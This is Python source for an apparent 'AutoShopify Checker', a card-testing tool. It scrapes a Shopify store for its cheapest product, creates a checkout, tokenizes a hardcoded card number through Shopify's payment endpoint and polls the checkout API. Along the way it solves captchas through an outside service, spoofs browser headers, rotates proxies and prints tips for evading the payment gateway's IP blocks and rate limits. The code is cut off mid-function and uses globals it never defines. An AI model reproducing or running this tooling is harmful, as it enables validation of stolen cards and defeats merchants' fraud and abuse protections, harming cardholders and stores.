"""
CxC AutoShopify Checker with Integrated Captcha Solver
Integrates Shopify Captcha Solver API for automatic captcha handling
Support: https://t.me/streetfind
"""

from flask import Flask, jsonify, request
import requests
import json
import uuid
import time
import random
import re
import urllib3
import sys
import logging

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
    sys.stderr.reconfigure(encoding="utf-8", errors="ignore")
except Exception:
    pass
import os
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# CAPTCHA SOLVER API INTEGRATION
# ============================================

CAPTCHA_API_URL = "https://your-captcha-api.railway.app"  # Your captcha API URL
CAPTCHA_API_KEY = "DARK-STORMX-DEEPX"  # Your captcha API key
USE_CAPTCHA_SOLVER = True  # Enable/disable captcha solver

def solve_captcha_auto(shop_url, max_retries=3):
    """
    Auto-detect and solve captcha using external API
    Returns captcha token if successful, None if failed
    """
    if not USE_CAPTCHA_SOLVER:
        return None
    
    for attempt in range(max_retries):
        try:
            response = requests.post(
                f"{CAPTCHA_API_URL}/api/v1/solve/auto",
                headers={"X-API-Key": CAPTCHA_API_KEY},
                json={"store_url": shop_url},
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    logger.info(f"✅ Captcha solved via API in {data.get('time_taken', 'N/A')}s")
                    return data.get("token")
                else:
                    logger.warning(f"⚠️ API error: {data.get('error', 'Unknown')}")
            else:
                logger.warning(f"⚠️ API request failed: {response.status_code}")
            
            if attempt < max_retries - 1:
                time.sleep(2)
                
        except requests.exceptions.Timeout:
            logger.warning("⚠️ Captcha API timeout")
        except Exception as e:
            logger.error(f"❌ Captcha API error: {e}")
    
    return None

# ============================================
# CHECKER CONFIGURATION
# ============================================

FAST_MODE = False
POLL_RECEIPT_MAX_ATTEMPTS = 10
SHORT_SLEEP = 3.0
MAX_WAIT_SECONDS = 8.0
HTTP_TIMEOUT_SHORT = 15
HTTP_TIMEOUT_MEDIUM = 20
STOP_AFTER_FIRST_RESULT = False
SINGLE_PROXY_ATTEMPT = True

CHECKOUT_DATA = {
    "email": "test@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "address1": "4024 College Point Boulevard",
    "city": "Flushing",
    "province": "NY",
    "zip": "11354",
    "country": "US",
    "phone": "2494851515",
    "coordinates": {
        "latitude": 40.7589,
        "longitude": -73.9851
    }
}

CARD_DATA = {
    "number": "4342580222985194",
    "month": 4,
    "year": 2028,
    "verification_value": "000",
    "name": "Test Card"
}

def create_session(shop_url, proxies=None):
    session = requests.Session()
    session.trust_env = False if proxies else True
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    })
    if proxies:
        try:
            session.proxies.update(proxies)
        except Exception:
            pass
    return session

def normalize_shop_url(shop_url):
    if not shop_url.startswith(('http://', 'https://')):
        shop_url = f"https://{shop_url}"
    return shop_url

def get_minimum_price_product_details(json_data=None):
    valid_products = []
    
    if json_data:
        try:
            products = json_data if isinstance(json_data, list) else json_data.get('products', [])
            
            for product in products:
                product_id = product.get('id')
                product_title = product.get('title', 'Unknown')
                variants = product.get('variants', [])
                
                for variant in variants:
                    variant_id = variant.get('id')
                    price_str = variant.get('price', '0')
                    available = variant.get('available', False)
                    
                    try:
                        price = float(price_str)
                        
                        if available and price > 0:
                            valid_products.append({
                                'id': str(product_id),
                                'variant_id': str(variant_id),
                                'price': price,
                                'price_str': price_str,
                                'title': product_title,
                                'available': True
                            })
                    except (ValueError, TypeError):
                        continue
            
            if valid_products:
                valid_products.sort(key=lambda x: x['price'])
                return valid_products[0]
                
        except Exception as e:
            print(f"  [DEBUG] JSON parsing error: {e}")
    
    return None

def auto_detect_cheapest_product(session, shop_url):
    print("[0/5] Auto-detecting cheapest product...")
    
    time.sleep(random.uniform(0.5, 1.5))

    all_found_products = []

    def choose_from_products_list(products, collect_all=False):
        valid_candidates = []
        
        for product in products or []:
            try:
                pt = product.get('title') or 'Unknown'
                pid = str(product.get('id') or "")
                variants = product.get('variants') or []
                for v in variants:
                    vid = str(v.get('id') or "")
                    price_str = str(v.get('price') or v.get('price_amount') or "0")
                    try:
                        price = float(price_str)
                    except Exception:
                        continue
                    
                    if price <= 0:
                        continue
                    
                    available = v.get('available', None)
                    if available is None:
                        inv_q = v.get('inventory_quantity')
                        inv_pol = (v.get('inventory_policy') or "").lower()
                        available = (isinstance(inv_q, (int, float)) and inv_q > 0) or inv_pol == "continue"
                    if not available:
                        continue
                    
                    candidate = (pid, vid, price, price_str, pt)
                    valid_candidates.append(candidate)
                    if collect_all:
                        all_found_products.append(candidate)
            except Exception:
                continue
        
        if valid_candidates:
            valid_candidates.sort(key=lambda x: x[2])
            return valid_candidates[0]
        
        return None

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via products.json: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/collections/all/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via collections/all: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass


    if FAST_MODE:
        print("  [FAST] Skipping slow sitemap/predictive search in FAST_MODE")
        if all_found_products:
            random_product = random.choice(all_found_products)
            pid, vid, price, price_str, title = random_product
            print(f"  🎲 Random product selected (FAST_MODE): {title} ${price_str}")
            return pid, vid, price_str, title
        return None, None, None, None


    handles = []
    try:
        url = f"{shop_url}/sitemap_products_1.xml"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200 and r.text:
            try:
                root = ET.fromstring(r.text)
                ns = {'sm': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
                for loc in root.findall('.//sm:url/sm:loc', ns):
                    loc_text = (loc.text or "").strip()
                    if not loc_text:
                        continue
                    m = re.search(r"/products/([^/?#]+)", loc_text)
                    if m:
                        handles.append(m.group(1))
                    if len(handles) >= 10:
                        break
            except Exception:
                pass
    except Exception:
        pass

    best = None
    for handle in handles:
        try:
            url = f"{shop_url}/products/{handle}.js"
            r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            product = {
                "id": data.get('id'),
                "title": data.get('title'),
                "variants": data.get('variants', [])
            }
            cand = choose_from_products_list([product], collect_all=True)
            if cand and ((best is None) or cand[2] < best[2]):
                best = cand
        except Exception:
            continue
    if best:
        pid, vid, price, price_str, title = best
        print(f"  ✅ Cheapest product found via sitemap: {title} ${price_str}")
        return pid, vid, price_str, title

    try:
        url = f"{shop_url}/search/suggest.json?q=a&resources[type]=product&resources[limit]=10"
        r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
        if r.status_code == 200:
            data = r.json()
            res = data.get('resources', {}).get('results', {}).get('products', []) if isinstance(data, dict) else []
            products = []
            for p in res:
                handle = p.get('handle')
                if not handle:
                    continue
                try:
                    pr = session.get(f"{shop_url}/products/{handle}.js", timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
                    if pr.status_code != 200:
                        continue
                    pdata = pr.json()
                    products.append({
                        "id": pdata.get('id'),
                        "title": pdata.get('title'),
                        "variants": pdata.get('variants', [])
                    })
                except Exception:
                    continue
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via predictive search: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    if all_found_products:
        random_product = random.choice(all_found_products)
        pid, vid, price, price_str, title = random_product
        print(f"  🎲 Random product selected (fallback): {title} ${price_str}")
        return pid, vid, price_str, title

    print(f"  ❌ Could not auto-detect any products")
    return None, None, None, None

def step1_add_to_cart(session, shop_url, variant_id):
    print("[1/5] Adding to cart and creating checkout...")
    
    add_url = f"{shop_url}/cart/add.js"
    payload = {"id": variant_id, "quantity": 1}
    
    try:
        r = session.post(add_url, json=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        print(f"  Add to cart: {r.status_code}")
    except Exception as e:
        print(f"  [ERROR] Add to cart request failed: {e}")
        raise
    
    checkout_url = f"{shop_url}/checkout"
    try:
        r = session.get(checkout_url, allow_redirects=True, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] Checkout init request failed: {e}")
        raise
    
    final_url = r.url
    if '/checkouts/cn/' in final_url:
        checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
        print(f"  [OK] Checkout token: {checkout_token}")
        
        meta_data = extract_checkout_meta_data(r.text)
        session_token = meta_data['session_token']
        stable_id = meta_data['stable_id']
        payment_method_id = meta_data['payment_method_id']
        
        return checkout_token, session_token, r.cookies, stable_id, payment_method_id
    
    return None, None, None, None, None

def extract_checkout_meta_data(html):
    from html import unescape
    data = {
        'session_token': None,
        'stable_id': None,
        'payment_method_id': None,
        'queue_token': None
    }
    
    # 1. Session Token
    patterns_session = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]+)"',
        r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"',
        r'<meta\s+content="([^"]+)"\s+name="serialized-session-token"',
        r'"serialized-sessionToken"\s+content="([^"]+)"',
        r'"serialized-session-token"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="serialized-session-token"'
    ]
    for pat in patterns_session:
        m = re.search(pat, html)
        if m:
            content = unescape(m.group(1))
            token = content.strip('"')
            if len(token) > 20:
                data['session_token'] = token
                break
    
    if not data['session_token']:
         print("  [WARNING] Session token not found")

    # 2. Stable ID
    patterns_stable = [
        r'stableId&quot;:&quot;([^&]+)&quot;',
        r'"stableId":"([^"]+)"',
        r'stableId":"([^"]+)"'
    ]
    for pat in patterns_stable:
        m = re.search(pat, html)
        if m:
            data['stable_id'] = unescape(m.group(1))
            print(f"  [OK] Found Stable ID: {data['stable_id'][:20]}...")
            break

    # 3. Payment Method Identifier
    patterns_pm = [
        r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
        r'"paymentMethodIdentifier":"([^"]+)"',
        r'paymentMethodIdentifier":"([^"]+)"'
    ]
    for pat in patterns_pm:
        m = re.search(pat, html)
        if m:
            data['payment_method_id'] = unescape(m.group(1))
            print(f"  [OK] Found Payment ID: {data['payment_method_id'][:20]}...")
            break
    
    if not data['payment_method_id']:
        print("  [WARNING] Payment Method Identifier not found in HTML")
            
    # 4. Queue Token (fallback)
    patterns_qt = [
        r'queueToken&quot;:&quot;([^&]+)&quot;',
        r'"queueToken":"([^"]+)"',
        r'queueToken":"([^"]+)"'
    ]
    for pat in patterns_qt:
        m = re.search(pat, html)
        if m:
            data['queue_token'] = unescape(m.group(1))
            break

    return data

def step2_tokenize_card(session, checkout_token, shop_url, card_data):
    print("[2/5] Tokenizing credit card...")
    
    time.sleep(random.uniform(1.2, 2.0))

    try:
        scope_host = urlparse(shop_url).netloc or shop_url.replace('https://', '').replace('http://', '').split('/')[0]
    except Exception:
        scope_host = shop_url.replace('https://', '').replace('http://', '').split('/')[0]

    payload = {
        "credit_card": {
            "number": card_data["number"],
            "month": card_data["month"],
            "year": card_data["year"],
            "verification_value": card_data["verification_value"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_data["name"]
        },
        "payment_session_scope": scope_host
    }

    endpoints = [
        ("https://checkout.pci.shopifyinc.com/sessions", "https://checkout.pci.shopifyinc.com", "https://checkout.pci.shopifyinc.com/"),
    ]

    last_status = None
    last_text_head = None

    for ep_url, origin, referer in endpoints:
        headers = {
            "Origin": origin,
            "Referer": referer,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Sec-CH-UA": '"Chromium";v="129", "Google Chrome";v="129", "Not=A?Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129 Safari/537.36"),
        }

        try:
            r = session.post(ep_url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [TOKEN] Request exception at {urlparse(ep_url).netloc}: {e}")
            continue

        last_status = r.status_code
        try:
            last_text_head = r.text[:300]
        except Exception:
            last_text_head = None

        if r.status_code == 200:
            try:
                token_data = r.json()
            except Exception:
                print(f"  [TOKEN] Invalid JSON from {urlparse(ep_url).netloc}")
                continue

            card_session_id = token_data.get("id")
            if card_session_id:
                print(f"  [OK] Card session ID: {card_session_id} via {urlparse(ep_url).netloc}")
                return card_session_id
            else:
                errs = token_data.get("errors") or token_data.get("error")
                if errs:
                    try:
                        print(f"  [TOKEN] {urlparse(ep_url).netloc} errors: {errs}")
                    except Exception:
                        pass
                continue
        else:
            if r.status_code == 403:
                print(f"  [TOKEN] 403 Forbidden - Proxy/IP blocked by payment gateway")
                print(f"  [TOKEN] This is a proxy issue, not a site issue")
            else:
                print(f"  [TOKEN] {urlparse(ep_url).netloc} HTTP {r.status_code}")
            continue

    if last_status == 403:
        print(f"  [ERROR] Tokenization blocked: 403 Forbidden")
        print(f"  [PROXY ISSUE] Payment gateway blocked your IP/proxy")
        print(f"  [SOLUTION] Try: 1) Different proxy, 2) Residential proxy, 3) Wait cooldown")
    elif last_status == 429:
        print(f"  [ERROR] Tokenization rate limited: 429 Too Many Requests")
        print(f"  [SOLUTION] Rotate proxy or wait before retry")
    else:
        print(f"  [ERROR] Tokenization failed across endpoints. last_status={last_status} head={last_text_head}")
    
    return None

def get_delivery_line_config(shipping_handle="any", destination_changed=True, merchandise_stable_id=None, use_full_address=False, phone_required=False, shipping_amount=None, currency_code="USD"):
    address_key = "streetAddress" if use_full_address else "partialStreetAddress"

    address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }

    if not use_full_address:
        address_data["address2"] = ""
        address_data["oneTimeUse"] = False
        address_data["coordinates"] = CHECKOUT_DATA.get("coordinates", {
            "latitude": 40.7589,
            "longitude": -73.9851
        })

    config = {
        "destination": {
            address_key: address_data
        },
        "targetMerchandiseLines": {"any": True} if not merchandise_stable_id else {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": destination_changed,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    if shipping_amount:
         config["expectedTotalPrice"] = {
             "value": {"amount": str(shipping_amount), "currencyCode": currency_code}
         }

    if phone_required:
        try:
            config["selectedDeliveryStrategy"]["options"] = {"phone": CHECKOUT_DATA["phone"]}
        except Exception:
            config["selectedDeliveryStrategy"]["options"] = {"phone": str(CHECKOUT_DATA.get("phone", "") or "")}

    return config

def poll_for_delivery_and_expectations(session, checkout_token, session_token, merchandise_stable_id, max_attempts=7):
    print(f"  [POLL] Waiting for delivery terms and expectations...")
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": "any",
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    shipping_handle = None
    shipping_amount = None
    delivery_expectations = []
    queue_token = None
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        
        if r.status_code != 200:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(SHORT_SLEEP)
            continue
        
        try:
            response = r.json()
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                time.sleep(SHORT_SLEEP)
                continue
            
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            if result.get('__typename') != 'NegotiationResultAvailable':
                time.sleep(SHORT_SLEEP)
                continue
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            exp_typename = delivery_exp_terms.get('__typename')
            
            checkout_total = seller_proposal.get('checkoutTotal', {})
            actual_total = None
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                actual_total = checkout_total.get('value', {}).get('amount')
            
            print(f"  Status - Delivery: {delivery_typename}, Expectations: {exp_typename}")
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  ✓ Got shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        
                        delivery_line["selectedDeliveryStrategy"] = {
                            "deliveryStrategyByHandle": {
                                "handle": shipping_handle,
                                "customDeliveryRate": False
                            },
                            "options": {
                                "phone": CHECKOUT_DATA["phone"]
                            }
                        }
                        if shipping_amount:
                            delivery_line["expectedTotalPrice"] = {
                                "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
                            }
                        
                        payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line
            
            if exp_typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations")
            
            if shipping_handle and delivery_expectations and actual_total:
                print(f"  [POLL] ✓ Complete! Handle: {shipping_handle[:30]}..., Total: ${actual_total}")
                return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations
            
            poll_delay = 500
            if delivery_typename == 'PendingTerms':
                poll_delay = delivery_terms.get('pollDelay', 500)
            elif exp_typename == 'PendingTerms':
                poll_delay = delivery_exp_terms.get('pollDelay', 500)
            
            wait_seconds = min(poll_delay / 1000.0, MAX_WAIT_SECONDS)
            time.sleep(wait_seconds)
            
        except Exception as e:
            print(f"  [ERROR] {e}")
            time.sleep(SHORT_SLEEP)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations

def detect_phone_requirement(seller_proposal):
    try:
        delivery_terms = seller_proposal.get('delivery', {})
        if delivery_terms.get('__typename') == 'FilledDeliveryTerms':
            delivery_lines = delivery_terms.get('deliveryLines', [])
            for line in delivery_lines:
                strategies = line.get('availableDeliveryStrategies', [])
                for strategy in strategies:
                    phone_required = strategy.get('phoneRequired', False)
                    if phone_required:
                        print(f"  [DETECT] ✓ Phone number IS required")
                        return True
        
        print(f"  [DETECT] Phone number NOT required")
        return False
    except Exception as e:
        print(f"  [DETECT] Error detecting: {e}")
        return True

def poll_proposal(session, checkout_token, session_token, merchandise_stable_id, shipping_handle, phone_required=False, shipping_amount=None, max_attempts=5):
    print(f"  [POLL] Polling for delivery expectations...")
    
    if not shipping_handle:
        print(f"  [POLL] No shipping handle available yet, skipping poll")
        return None, []
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            },
            "options": {
                "phone": CHECKOUT_DATA["phone"]
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    if shipping_amount:
        delivery_line["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": "USD"}}
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [ERROR] HTTP request failed: {e}")
            time.sleep(SHORT_SLEEP)
            continue
        
        if r.status_code == 200:
            try:
                response = r.json()
                
                if attempt == 0 and not SUMMARY_ONLY:
                    with open("poll_response.json", "w") as f:
                        json.dump(response, f, indent=2)
                
                if 'errors' in response:
                    print(f"  [ERROR] GraphQL errors:")
                    for error in response['errors']:
                        print(f"    - {error.get('message', 'Unknown')}")
                    time.sleep(2)
                    continue
                
                result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                seller_proposal = result.get('sellerProposal', {})
                delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
                
                typename = delivery_exp_terms.get('__typename')
                
                if typename == 'FilledDeliveryExpectationTerms':
                    print(f"  [POLL] ✓ Ready!")
                    
                    expectations = delivery_exp_terms.get('deliveryExpectations', [])
                    delivery_expectations = []
